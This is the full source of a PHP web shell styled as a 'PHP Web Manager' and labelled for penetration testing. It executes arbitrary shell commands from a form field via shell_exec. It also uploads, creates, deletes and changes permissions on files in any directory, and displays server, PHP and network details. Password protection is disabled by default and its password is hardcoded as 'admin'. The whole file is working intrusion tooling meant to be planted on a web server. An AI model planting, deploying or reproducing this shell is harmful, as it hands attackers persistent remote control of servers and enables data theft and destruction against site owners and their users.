<?php
/**
 * PHP Web Manager - Simple Web Shell
 * For penetration testing and authorized testing only
 * Features: File Manager, Terminal, System Info
 */

session_start();
error_reporting(0);
set_time_limit(0);

// Configuration
$password = "admin"; // Change this
$auth_enabled = false; // Set true to enable password

// Auth check
if ($auth_enabled && !isset($_SESSION['auth'])) {
    if (isset($_POST['login'])) {
        if ($_POST['password'] === $password) {
            $_SESSION['auth'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Invalid password!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login - Web Manager</title>
        <style>
            body { font-family: Arial; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .login-box { background: #16213e; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 300px; }
            h2 { text-align: center; margin-bottom: 20px; color: #e94560; }
            input[type="password"] { width: 100%; padding: 10px; margin-bottom: 10px; border: none; border-radius: 5px; background: #0f3460; color: #fff; }
            input[type="submit"] { width: 100%; padding: 10px; background: #e94560; border: none; border-radius: 5px; color: #fff; cursor: pointer; }
            .error { color: #e94560; text-align: center; margin-bottom: 10px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>Web Manager</h2>
            <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>
            <form method="post">
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" name="login" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Get current directory
$cwd = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$cwd = realpath($cwd);
if ($cwd === false) $cwd = getcwd();

// File operations
$message = "";
if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
                move_uploaded_file($_FILES['file']['tmp_name'], $cwd . '/' . $_FILES['file']['name']);
                $message = "File uploaded: " . $_FILES['file']['name'];
            }
            break;
        case 'delete':
            if (isset($_POST['file'])) {
                $file = $cwd . '/' . $_POST['file'];
                if (is_dir($file)) {
                    rmdir($file);
                } else {
                    unlink($file);
                }
                $message = "Deleted: " . $_POST['file'];
            }
            break;
        case 'mkdir':
            if (isset($_POST['dirname'])) {
                mkdir($cwd . '/' . $_POST['dirname']);
                $message = "Directory created: " . $_POST['dirname'];
            }
            break;
        case 'create':
            if (isset($_POST['filename']) && isset($_POST['content'])) {
                file_put_contents($cwd . '/' . $_POST['filename'], $_POST['content']);
                $message = "File created: " . $_POST['filename'];
            }
            break;
        case 'chmod':
            if (isset($_POST['file']) && isset($_POST['perms'])) {
                chmod($cwd . '/' . $_POST['file'], octdec($_POST['perms']));
                $message = "Permissions changed: " . $_POST['file'];
            }
            break;
    }
}

// Execute command
$output = "";
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
}

// Get files in current directory
$files = array_diff(scandir($cwd), array('.', '..'));
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Courier New', monospace; background: #1a1a2e; color: #eaeaea; }
        
        /* Header */
        .header { background: #16213e; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #e94560; }
        .title { color: #e94560; font-size: 20px; font-weight: bold; }
        .server-info { font-size: 12px; color: #aaa; }
        
        /* Container */
        .container { display: flex; height: calc(100vh - 60px); }
        
        /* Sidebar */
        .sidebar { width: 200px; background: #0f3460; padding: 20px; overflow-y: auto; }
        .nav-item { padding: 10px; margin-bottom: 5px; cursor: pointer; border-radius: 5px; transition: 0.3s; }
        .nav-item:hover, .nav-item.active { background: #e94560; }
        .nav-item.active { background: #e94560; }
        
        /* Main Content */
        .main-content { flex: 1; padding: 20px; overflow-y: auto; }
        
        /* File Manager */
        .file-manager { display: none; }
        .file-manager.active { display: block; }
        
        .path-bar { background: #16213e; padding: 10px; margin-bottom: 15px; border-radius: 5px; display: flex; align-items: center; }
        .path-bar span { color: #e94560; margin-right: 5px; }
        .path-bar input { flex: 1; background: transparent; border: none; color: #fff; font-family: inherit; }
        
        .file-list { background: #16213e; border-radius: 5px; overflow: hidden; }
        .file-item { display: flex; padding: 10px; border-bottom: 1px solid #0f3460; cursor: pointer; transition: 0.2s; }
        .file-item:hover { background: #0f3460; }
        .file-icon { width: 30px; margin-right: 10px; text-align: center; }
        .file-name { flex: 1; }
        .file-size { width: 100px; text-align: right; color: #aaa; }
        .file-perms { width: 100px; text-align: right; color: #e94560; }
        .file-actions { width: 100px; text-align: right; }
        .file-actions a { color: #e94560; text-decoration: none; margin-left: 5px; }
        
        .file-actions form { display: inline; }
        
        /* Terminal */
        .terminal { display: none; }
        .terminal.active { display: block; }
        
        .terminal-box { background: #000; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; }
        .terminal-output { white-space: pre-wrap; color: #00ff00; margin-bottom: 10px; max-height: 400px; overflow-y: auto; }
        .terminal-input { display: flex; align-items: center; }
        .terminal-prompt { color: #00ff00; margin-right: 10px; }
        .terminal-input input { flex: 1; background: transparent; border: none; color: #00ff00; font-family: inherit; }
        
        /* System Info */
        .system-info { display: none; }
        .system-info.active { display: block; }
        
        .info-box { background: #16213e; padding: 15px; margin-bottom: 15px; border-radius: 5px; }
        .info-title { color: #e94560; margin-bottom: 10px; font-weight: bold; }
        .info-content { color: #aaa; line-height: 1.6; }
        
        /* Forms */
        .form-box { background: #16213e; padding: 15px; margin-top: 15px; border-radius: 5px; display: none; }
        .form-box.active { display: block; }
        .form-box input, .form-box textarea { width: 100%; padding: 10px; margin-bottom: 10px; background: #0f3460; border: 1px solid #e94560; border-radius: 5px; color: #fff; }
        .form-box button { background: #e94560; border: none; padding: 10px 20px; border-radius: 5px; color: #fff; cursor: pointer; }
        
        /* Message */
        .message { background: #0f3460; padding: 10px; margin-bottom: 15px; border-radius: 5px; color: #00ff00; }
        
        /* Table */
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; }
        th { background: #0f3460; color: #e94560; }
        tr:hover { background: #0f3460; }
        
        .btn { background: #e94560; color: #fff; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; text-decoration: none; display: inline-block; }
        .btn-small { padding: 3px 8px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <div class="title">PHP Web Manager</div>
        <div class="server-info">
            <?php echo php_uname(); ?> | <?php echo get_current_user(); ?> | <?php echo getmyuid(); ?>
        </div>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <div class="nav-item active" onclick="showTab('file-manager')">📁 File Manager</div>
            <div class="nav-item" onclick="showTab('terminal')">💻 Terminal</div>
            <div class="nav-item" onclick="showTab('system-info')">ℹ️ System Info</div>
            <div class="nav-item" onclick="showForm('upload')">⬆️ Upload</div>
            <div class="nav-item" onclick="showForm('mkdir')">📁 New Dir</div>
            <div class="nav-item" onclick="showForm('create')">📄 New File</div>
        </div>
        
        <div class="main-content">
            <?php if ($message) echo "<div class='message'>$message</div>"; ?>
            
            <!-- File Manager -->
            <div id="file-manager" class="file-manager active">
                <div class="path-bar">
                    <span>📁</span>
                    <input type="text" value="<?php echo htmlspecialchars($cwd); ?>" readonly>
                </div>
                
                <div class="file-list">
                    <?php foreach ($files as $file): ?>
                        <?php
                        $path = $cwd . '/' . $file;
                        $is_dir = is_dir($path);
                        $size = $is_dir ? '-' : filesize($path);
                        $perms = substr(sprintf('%o', fileperms($path)), -4);
                        $icon = $is_dir ? '📁' : '📄';
                        ?>
                        <div class="file-item" onclick="selectFile('<?php echo $file; ?>')">
                            <div class="file-icon"><?php echo $icon; ?></div>
                            <div class="file-name">
                                <?php if ($is_dir): ?>
                                    <a href="?dir=<?php echo urlencode($cwd . '/' . $file); ?>" style="color: #e94560; text-decoration: none;">
                                        <?php echo htmlspecialchars($file); ?>
                                    </a>
                                <?php else: ?>
                                    <?php echo htmlspecialchars($file); ?>
                                <?php endif; ?>
                            </div>
                            <div class="file-size"><?php echo $size; ?></div>
                            <div class="file-perms"><?php echo $perms; ?></div>
                            <div class="file-actions">
                                <form method="post" style="display:inline">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="file" value="<?php echo $file; ?>">
                                    <button type="submit" class="btn btn-small">🗑️</button>
                                </form>
                                <a href="?action=download&file=<?php echo urlencode($file); ?>" class="btn btn-small">⬇️</a>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
                
                <!-- Upload Form -->
                <div id="upload-form" class="form-box">
                    <h3>Upload File</h3>
                    <form method="post" enctype="multipart/form-data">
                        <input type="hidden" name="action" value="upload">
                        <input type="file" name="file" required>
                        <button type="submit">Upload</button>
                    </form>
                </div>
                
                <!-- Mkdir Form -->
                <div id="mkdir-form" class="form-box">
                    <h3>Create Directory</h3>
                    <form method="post">
                        <input type="hidden" name="action" value="mkdir">
                        <input type="text" name="dirname" placeholder="Directory name" required>
                        <button type="submit">Create</button>
                    </form>
                </div>
                
                <!-- Create File Form -->
                <div id="create-form" class="form-box">
                    <h3>Create File</h3>
                    <form method="post">
                        <input type="hidden" name="action" value="create">
                        <input type="text" name="filename" placeholder="File name" required>
                        <textarea name="content" placeholder="File content" rows="10"></textarea>
                        <button type="submit">Create</button>
                    </form>
                </div>
            </div>
            
            <!-- Terminal -->
            <div id="terminal" class="terminal">
                <div class="terminal-box">
                    <div class="terminal-output"><?php echo htmlspecialchars($output); ?></div>
                    <form method="post">
                        <div class="terminal-input">
                            <span class="terminal-prompt"><?php echo get_current_user(); ?>@<?php echo gethostname(); ?>:~$</span>
                            <input type="text" name="cmd" placeholder="Enter command..." autofocus>
                        </div>
                    </form>
                </div>
            </div>
            
            <!-- System Info -->
            <div id="system-info" class="system-info">
                <div class="info-box">
                    <div class="info-title">System Information</div>
                    <div class="info-content">
                        <strong>OS:</strong> <?php echo php_uname('s') . ' ' . php_uname('r'); ?><br>
                        <strong>Kernel:</strong> <?php echo php_uname('v'); ?><br>
                        <strong>Hostname:</strong> <?php echo gethostname(); ?><br>
                        <strong>PHP Version:</strong> <?php echo phpversion(); ?><br>
                        <strong>Server Software:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
                        <strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT']; ?><br>
                        <strong>Current Directory:</strong> <?php echo getcwd(); ?><br>
                        <strong>User:</strong> <?php echo get_current_user(); ?> (<?php echo getmyuid(); ?>)<br>
                        <strong>Safe Mode:</strong> <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?><br>
                        <strong>Disable Functions:</strong> <?php echo ini_get('disable_functions') ?: 'None'; ?><br>
                        <strong>Memory Limit:</strong> <?php echo ini_get('memory_limit'); ?><br>
                        <strong>Upload Max:</strong> <?php echo ini_get('upload_max_filesize'); ?><br>
                        <strong>Post Max:</strong> <?php echo ini_get('post_max_size'); ?>
                    </div>
                </div>
                
                <div class="info-box">
                    <div class="info-title">Network Information</div>
                    <div class="info-content">
                        <strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?><br>
                        <strong>Client IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?><br>
                        <strong>Server Port:</strong> <?php echo $_SERVER['SERVER_PORT']; ?><br>
                        <strong>Request URI:</strong> <?php echo $_SERVER['REQUEST_URI']; ?>
                    </div>
                </div>
                
                <div class="info-box">
                    <div class="info-title">Loaded Extensions</div>
                    <div class="info-content"><?php echo implode(', ', get_loaded_extensions()); ?></div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        function showTab(tabId) {
            document.querySelectorAll('.file-manager, .terminal, .system-info').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.target.classList.add('active');
        }
        
        function showForm(formId) {
            document.querySelectorAll('.form-box').forEach(el => el.classList.remove('active'));
            document.getElementById(formId + '-form').classList.add('active');
        }
        
        function selectFile(filename) {
            document.querySelectorAll('.file-item').forEach(el => el.style.background = '');
            event.currentTarget.style.background = '#0f3460';
        }
    </script>
</body>
</html>
